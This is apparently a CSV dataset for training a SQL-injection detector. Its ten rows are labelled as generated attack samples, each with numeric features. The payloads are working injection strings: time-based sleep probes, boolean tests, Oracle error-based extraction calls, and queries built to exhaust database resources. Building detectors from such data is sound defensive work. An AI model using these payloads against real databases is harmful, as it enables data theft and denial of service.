id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000971,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",nearest_attack_euclidean,R007681,3.5086164759301366,145.8216094970703,58.773868560791016,25.271160125732422,57.23061752319336,-2.7876923084259033,31.62513542175293,23.50608253479004,0.999722421169281,0.3878878355026245,0.12960854172706604,0.39522963762283325,0.12217606604099274,3.4026291370391846,0.2542916238307953,0.7514530420303345,0.662630558013916,0.18504081666469574,-0.033290695399045944,-0.052799906581640244,8.166668891906738,7.160305976867676,2.5673248767852783,-0.010859081521630287,1.553521990776062,-0.05088295787572861,-0.05940372124314308,0.598486065864563,0.4590120017528534,-0.11199743300676346,-0.009315975941717625,0.007505141664296389,-0.04644143953919411,0.0281678494066,0.20742814242839813,1.1187281608581543,5.237154960632324,-0.04079119488596916,0.15893404185771942,-0.14381147921085358,-0.07678434997797012,0.23108983039855957,-0.0589018352329731,0.05017610639333725,-0.016922684386372566,-0.012126848101615906,-0.006074979435652494,0.2513321042060852,0.21766002476215363,0.07932759821414948,0.15162870287895203,0.3979937732219696,0.20222191512584686,-5.501358464243822e-05,0.009688137099146843,-0.018739808350801468,0.034131452441215515,0.20883499085903168,0.00018867738253902644,0.25459277629852295,0.0023496600333601236,-0.18006837368011475,0.0034152769949287176,1.0138545036315918,0.009861832484602928,0.0016609305748715997,0.022791728377342224,0.0305417999625206,-0.16553640365600586,-0.0008360923966392875,0.048734452575445175,-0.00539732538163662,-0.0012483273167163134,-0.029448335990309715,-8.642097964184359e-05,-0.06713802367448807,1.462249994277954,-0.18086957931518555,4.642043131752871e-05,-0.03614892065525055,-0.004848707001656294,3.638118267059326,0.7224485874176025,0.051798753440380096,0.09665468335151672,0.003565482795238495,0.0720532089471817,0.018232503905892372,0.005342516116797924
GAN_000972,attack,time,"1 or elt  (  6272  =  6272,sleep  (  5   )    )   # klaw",nearest_attack_euclidean,R006497,5.285349162133791,16.687196731567383,30.268177032470703,5.404106616973877,14.641639709472656,-0.25218674540519714,19.596052169799805,2.9612503051757812,0.9986366033554077,0.40690672397613525,0.023087333887815475,0.4485052824020386,0.08402524143457413,3.6059343814849854,0.5642218589782715,1.6267231702804565,0.5134949088096619,0.9278662800788879,0.08876051008701324,-0.010527387261390686,0.9291398525238037,3.933342933654785,0.07069680094718933,0.014656979590654373,0.8796632885932922,0.07023275643587112,0.04665254056453705,0.11129098385572433,-0.7261148691177368,0.8934422731399536,-0.12451818585395813,0.07421538233757019,-0.2943156063556671,0.025798717513680458,0.9718310236930847,0.6000991463661194,1.7989494800567627,1.3963706493377686,0.5463453531265259,-0.018841996788978577,0.14650709927082062,0.6562161445617676,0.582448422908783,0.06365256011486053,0.1328810602426529,-0.019829537719488144,-0.014575259760022163,0.17596811056137085,-0.05614357069134712,0.027787672355771065,-0.19006359577178955,-0.04794378951191902,0.12104444205760956,-0.003119878936558962,0.005309848114848137,0.02883141115307808,0.023541949689388275,-0.17412620782852173,-0.00916027557104826,-0.6474543809890747,0.003809734946116805,-0.3042844533920288,-0.010035029612481594,0.36740005016326904,0.10031252354383469,-0.0015789581229910254,-0.036346469074487686,-0.23779822885990143,-0.6479249000549316,0.006278045941144228,0.009199146181344986,0.009410025551915169,0.0016644354909658432,-0.0074538057669997215,-0.005091176833957434,0.0012131599942222238,0.014696749858558178,1.7456612586975098,-0.004269328899681568,0.10356105118989944,0.0697573721408844,0.7609614729881287,1.1281628608703613,-0.14292259514331818,0.6613778471946716,-0.05697811394929886,-0.013901989907026291,-0.1745663583278656,-0.008932862430810928
GAN_000973,attack,boolean,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,nearest_attack_euclidean,R007107,6.179165368810916,175.08399963378906,64.00301361083984,29.866439819335938,33.39118194580078,-4.914525508880615,34.62883758544922,18.12010955810547,0.9992173314094543,0.3582408130168915,0.12415316700935364,0.47539547085762024,0.10838953405618668,3.7239396572113037,0.9986818432807922,-1.3204525709152222,1.4116997718811035,0.2093900740146637,-0.0555565245449543,-0.0757373571395874,9.9482421875,6.785649299621582,1.25306236743927,-0.05480293557047844,1.9697014093399048,-0.0929218977689743,-0.03168051689863205,0.22953474521636963,1.702708125114441,0.18610990047454834,0.03657145798206329,0.011380242183804512,-0.1271226704120636,0.007579794153571129,0.4293673038482666,1.3895009756088257,5.984005928039551,-0.4704703390598297,0.8458787798881531,-0.3155441880226135,0.12890471518039703,0.49027174711227417,0.0025107813999056816,0.06201489642262459,-0.06606820225715637,-0.024081707000732422,-0.02669474110007286,0.676405668258667,0.7108405828475952,0.3862963914871216,0.4046647548675537,1.045474648475647,0.2078421711921692,0.07298312336206436,-0.0177899282425642,-0.0404292494058609,0.0810350850224495,0.0979117751121521,0.031967341899871826,0.2688080966472626,0.00919718760997057,0.19752907752990723,-0.0016048552934080362,2.204070806503296,0.17315949499607086,0.08752697706222534,-0.035201188176870346,0.16252388060092926,0.01304672472178936,0.001721200067549944,0.0511578731238842,-0.008544604294002056,-0.006493112072348595,-0.010508530773222446,0.005266527179628611,-0.021864237263798714,1.3364335298538208,-0.3540152311325073,0.013821435160934925,-0.21436341106891632,0.006558783818036318,8.64206314086914,0.5187515616416931,0.1719539761543274,0.11766703426837921,-0.009614847600460052,0.03449466824531555,0.03175266832113266,0.0068730078637599945
GAN_000974,attack,other,"  (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R008974,4.236018369160371,96.05152893066406,32.36021423339844,5.02284574508667,50.77424240112305,-0.11211428046226501,30.402095794677734,19.653209686279297,1.0000964403152466,0.4380294978618622,0.05795374885201454,0.3399151861667633,0.12622657418251038,3.151129961013794,-0.02635095827281475,-0.2717133164405823,0.8136851787567139,0.3532983064651489,0.09996935725212097,0.05544839799404144,3.4403634071350098,2.180445432662964,1.9361693859100342,0.007010397966951132,0.5356877446174622,0.07305862754583359,0.01408572867512703,0.6144858598709106,-0.5720371603965759,0.36935877799987793,0.06766664236783981,0.05450908839702606,-0.356147438287735,-0.05041426420211792,0.8078329563140869,0.34284985065460205,2.559872627258301,0.02889372780919075,0.9672643542289734,0.06531105935573578,0.4545116126537323,0.9704340696334839,0.16501227021217346,-0.04659577086567879,0.018544482067227364,0.044318750500679016,-0.009637150913476944,0.060419220477342606,-0.18388323485851288,0.046212088316679,0.01464698277413845,-0.0837458074092865,-0.13751603662967682,-0.06644856929779053,0.07771985232830048,0.018688073381781578,0.05038246884942055,0.05675750970840454,-0.009743351489305496,0.18169033527374268,0.0003722106630448252,-0.12061768770217896,-0.006043266039341688,-0.7585678100585938,-0.06453695148229599,-0.054997049272060394,-0.026130009442567825,-0.17946641147136688,0.09480337798595428,0.0011460221139714122,-0.0004330793453846127,0.006748186890035868,0.0016061406349763274,0.0232270248234272,0.005936008412390947,0.08633246272802353,-0.6548506617546082,0.5071797966957092,-0.0010265117743983865,0.01941659115254879,-0.06031862273812294,2.0472726821899414,0.3371394872665405,0.0071981619112193584,0.06215158849954605,-0.03752578794956207,0.010603395290672779,-0.17227520048618317,0.01325810607522726
GAN_000975,attack,error,1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- icxn,nearest_attack_euclidean,R004598,6.753794079351761,277.72369384765625,113.9055404663086,39.18887710571289,166.82162475585938,-0.9732761383056641,59.09113693237305,62.703800201416016,1.0014138221740723,0.5174384713172913,0.10186655074357986,0.49260762333869934,0.16232439875602722,3.5136454105377197,1.2079551219940186,-1.245693325996399,2.4700841903686523,0.13869763910770416,0.175882950425148,0.013901114463806152,11.641573905944824,10.167829513549805,1.773833990097046,-0.03639805689454079,1.8960894346237183,0.048151206225156784,-0.04145761951804161,0.13547392189502716,1.4921778440475464,-0.2973784804344177,0.11014825105667114,0.08069133013486862,-0.7289934158325195,0.25867676734924316,0.3197785019874573,2.2526135444641113,9.527732849121094,-0.31573113799095154,2.382028818130493,-0.042973145842552185,0.10462825745344162,1.4625463485717773,0.23744894564151764,-0.28801798820495605,-0.1667688935995102,0.0014914640923961997,-0.10704941302537918,0.9671146869659424,1.039354681968689,1.0908513069152832,1.1932679414749146,1.4402129650115967,-0.9918379783630371,-0.14002546668052673,0.04775247722864151,-0.006583303678780794,0.006994565948843956,-0.04643202945590019,-0.02586274966597557,0.8028169870376587,-0.0022867321968078613,0.22045007348060608,-0.005461705382913351,0.31260553002357483,0.041403185576200485,-0.046677365899086,-0.09113143384456635,-0.3935032784938812,0.9398558139801025,0.0012376835802569985,0.03775341436266899,-2.9321898182388395e-05,0.00934601854532957,0.14827772974967957,0.01972336880862713,0.13177309930324554,-0.2783016860485077,-0.2694772481918335,-0.004309346899390221,0.1397543102502823,-0.2620251476764679,9.37828540802002,0.6346470713615417,0.022250808775424957,0.040189944207668304,0.14010290801525116,0.034806717187166214,-0.3001546263694763,0.05997096747159958
GAN_000976,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",nearest_attack_euclidean,R005901,5.089111017029527,83.47245788574219,33.258846282958984,-1.0253318548202515,14.560770034790039,0.23786388337612152,30.33557891845703,11.342662811279297,0.9999691247940063,0.5079566836357117,-0.026865828782320023,0.29282599687576294,0.050129104405641556,2.937831163406372,-1.37786066532135,-0.9574977159500122,-0.5712335705757141,1.3481624126434326,0.00018618549802340567,0.0828050822019577,2.641906499862671,0.805340051651001,2.076720952987671,0.0014371135039255023,0.2233070433139801,0.06059414893388748,0.031583406031131744,0.9374815821647644,-0.8785518407821655,0.9435293078422546,0.11328524351119995,0.06631176173686981,-0.5088129043579102,0.022351669147610664,1.266275405883789,-0.039072562009096146,2.9907543659210205,-0.6556429266929626,0.940312922000885,0.06734175980091095,0.07497336715459824,1.323448896408081,0.029680192470550537,0.07875111699104309,0.11339318752288818,0.08910642564296722,-0.005443734582513571,0.004285300616174936,-0.2759159803390503,-0.009987322613596916,-0.172328382730484,-0.22006110846996307,0.04498158022761345,-0.04870140179991722,0.15467137098312378,0.013652537018060684,0.07167556881904602,0.002910875016823411,-0.0015781901311129332,0.12547199428081512,0.0014505970757454634,-0.3334958851337433,-0.00897977128624916,-1.1137804985046387,-0.05102276802062988,-0.04921472445130348,0.021151084452867508,-0.273510605096817,0.059885911643505096,0.0036705746315419674,0.00018430929048918188,0.004692616406828165,0.001366092124953866,0.016130302101373672,0.026893598958849907,0.10884372144937515,-0.01531317550688982,0.5674442052841187,-0.005956828594207764,-0.09584783017635345,0.021806025877594948,1.9470700025558472,0.3378271460533142,0.12118317931890488,-0.0021169919054955244,-0.0029249638319015503,-0.011674085631966591,-0.026072150096297264,0.01872735098004341
GAN_000977,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and ""uvoq"" like ""uvoq",nearest_attack_euclidean,R004679,10.38355257264647,-68.08179473876953,19.558134078979492,-9.894380569458008,4.566318511962891,0.3669067919254303,34.37587356567383,6.37811279296875,0.9986162185668945,0.36758899688720703,-0.24456879496574402,0.5979978442192078,0.14659127593040466,3.789823055267334,2.689035654067993,3.7485594749450684,-1.4217393398284912,0.31631967425346375,0.07717479765415192,-0.05079664662480354,-1.0707459449768066,4.478703498840332,-0.4646594822406769,0.06817626953125,0.06084110587835312,0.03791607916355133,0.06538856029510498,-0.2722732424736023,-1.3138631582260132,1.2960638999938965,-0.15930971503257751,-0.054277412593364716,0.8958722949028015,-0.07998950034379959,0.12831942737102509,-0.43852561712265015,5.673861026763916,4.368463039398193,0.24372439086437225,-0.07124955952167511,-0.5965309739112854,0.6746892333030701,2.054492235183716,0.17095786333084106,0.3481631278991699,0.02709011733531952,0.06034158542752266,0.0850551426410675,-0.01858455501496792,0.2997633218765259,-0.017100045457482338,-0.4724688231945038,0.6910315752029419,0.08698465675115585,-0.13542886078357697,0.10324548184871674,0.13645800948143005,-0.45003053545951843,0.03047272562980652,-1.5527870655059814,0.011221364140510559,-0.3124330937862396,-0.014748206362128258,2.869502067565918,0.04458627849817276,-0.001591524458490312,-0.13792596757411957,0.028982073068618774,-1.0630100965499878,0.02336728386580944,-0.07362743467092514,0.005356634967029095,0.009099497459828854,0.029162604361772537,-0.02795347571372986,-0.1759844869375229,1.5089726448059082,1.4610532522201538,-0.024972345679998398,0.829039454460144,0.35248520970344543,1.494881510734558,0.5287043452262878,-0.04493338614702225,2.361553907394409,0.005227722227573395,-0.014011431485414505,0.42204418778419495,-0.02091638743877411
GAN_000978,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",nearest_attack_euclidean,R008186,6.219659426952222,-31.229787826538086,27.33622169494629,-3.590599298477173,51.69635009765625,2.1369712352752686,22.442014694213867,9.882120132446289,0.9996594190597534,0.41945427656173706,-0.08979585766792297,0.5154692530632019,0.10630664229393005,3.0548691749572754,0.035652775317430496,2.2141590118408203,-0.3927580714225769,0.13579922914505005,0.21466927230358124,-0.009071707725524902,0.16756151616573334,4.731106281280518,0.3596824109554291,0.053763002157211304,0.3777925670146942,0.10740779340267181,0.001389718265272677,-0.4158771336078644,-0.9765286445617676,0.43395933508872986,-0.0680629312992096,-0.03862745687365532,0.28660666942596436,-0.14184270799160004,0.2238171547651291,0.0028683668933808804,4.503262996673584,2.097882032394409,0.09373550117015839,-0.07938779890537262,0.016542693600058556,0.15142564475536346,1.6102780103683472,-0.025966620072722435,0.15982192754745483,0.05428044870495796,0.03450217843055725,-0.043468061834573746,-0.010289018973708153,0.23785732686519623,0.20145419239997864,-0.3005332946777344,0.33260753750801086,0.006485896650701761,-0.04935847967863083,0.08129364252090454,0.08344757556915283,-0.289908230304718,0.0026832139119505882,-0.6919717192649841,0.006851704325526953,-0.03218400850892067,-0.002967418637126684,1.1577776670455933,-0.04686042293906212,-0.0612417533993721,-0.15847042202949524,0.031900037080049515,-0.3996799886226654,0.019403653219342232,-0.051932722330093384,0.006510864477604628,0.005866645369678736,0.05660701170563698,-0.012050298042595387,-0.1075935810804367,0.8082461357116699,0.9098109006881714,-0.014583904296159744,0.6362386345863342,0.12190808355808258,-0.6636629700660706,0.31515470147132874,-0.016359485685825348,1.695778489112854,-0.0693887248635292,-0.03314180299639702,0.19063226878643036,-0.006557789631187916
GAN_000979,attack,boolean,"1   )    )    as uizx where 2512  =  2512 and make_set  (  1402  =  2908,2908  )  --",nearest_attack_euclidean,R001975,3.201590463308404,104.38335418701172,35.42369842529297,26.844409942626953,52.64924621582031,-0.6912428140640259,24.345687866210938,13.803996086120605,0.9996483325958252,0.3630874752998352,0.21211665868759155,0.38474372029304504,0.0774930939078331,3.582866907119751,-0.2591486871242523,0.3888120949268341,1.6585801839828491,0.3693365156650543,0.04311993345618248,0.015081727877259254,4.289334297180176,4.916846752166748,1.6188923120498657,-0.00399364298209548,1.8961329460144043,0.050826262682676315,-0.017290204763412476,0.3950323462486267,0.0675821527838707,0.04429122060537338,-0.03506109118461609,0.07990044355392456,-0.21229013800621033,0.02412322349846363,1.0931888818740845,1.5991367101669312,1.5764533281326294,-0.018412631005048752,0.3461431562900543,-0.024198323488235474,0.8123547434806824,0.3605859577655792,-0.015650112181901932,0.010683566331863403,0.03665710613131523,-0.03314468637108803,-0.014763778075575829,0.0658169835805893,-0.08946157246828079,-0.15570081770420074,-0.12901335954666138,-0.057559121400117874,0.0768415629863739,-0.05431723967194557,0.03418036177754402,0.012292644940316677,0.021464284509420395,0.08703621476888657,-0.012123574502766132,0.03031320683658123,0.003102219430729747,-0.29134324193000793,0.0008578216657042503,0.2992546558380127,0.007045299280434847,-0.01657608151435852,-0.0003128832613583654,-0.026091191917657852,-0.13221906125545502,0.0006093379342928529,0.04108523949980736,0.00313260848633945,-0.0007340619340538979,-0.03136005625128746,-0.006832957733422518,0.04093785956501961,0.5504937171936035,0.47959303855895996,0.001932886429131031,-0.007087314035743475,-0.0177244134247303,1.7865506410598755,1.1332327127456665,-0.10621694475412369,0.10621728003025055,-0.037374891340732574,0.01511456724256277,-0.2254204899072647,-0.009661630727350712
GAN_000980,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,11.108707202549349,313.9023132324219,129.75445556640625,52.71856689453125,156.05653381347656,-3.1520795822143555,50.85379409790039,62.10499954223633,1.0004312992095947,0.5094842314720154,0.1534479856491089,0.5792324542999268,0.15522058308124542,3.6862430572509766,1.9847817420959473,-2.5198020935058594,2.9414281845092773,0.08904094994068146,0.22779101133346558,-0.04731805622577667,14.489688873291016,12.19362735748291,0.5038774609565735,-0.07610277086496353,2.5287234783172607,-0.026125412434339523,-0.03811797872185707,-0.07851649820804596,2.947171211242676,0.04718159884214401,0.17761416733264923,0.06797622889280319,-0.45824334025382996,0.2837517261505127,-0.18074621260166168,2.798124313354492,10.27241039276123,-0.5912602543830872,2.8445820808410645,-0.20277957618236542,0.059687189757823944,1.4371824264526367,0.39676329493522644,-0.32080942392349243,-0.31311115622520447,-0.01576361618936062,-0.1403607577085495,1.7423683404922485,1.8689749240875244,1.8419514894485474,1.806762933731079,2.7477614879608154,-1.1533244848251343,-0.061695415526628494,-0.05549738556146622,-0.04560631141066551,0.05128978192806244,-0.1377309262752533,0.012014280073344707,0.8538583517074585,0.003751588286831975,0.608340859413147,-0.0050774188712239265,1.3672338724136353,0.20022746920585632,0.019735919311642647,-0.1990007758140564,-0.0649167075753212,1.121643304824829,0.0008294684812426567,0.06239291653037071,-0.009068717248737812,0.00677721481770277,0.20303818583488464,0.019556738436222076,0.12598147988319397,-0.1327921450138092,-0.3587590456008911,0.012058439664542675,0.015805212780833244,-0.2517215609550476,15.756773948669434,0.6373046636581421,0.16706617176532745,0.192031592130661,0.20352374017238617,0.05377708747982979,-0.12329372018575668,0.07668808102607727
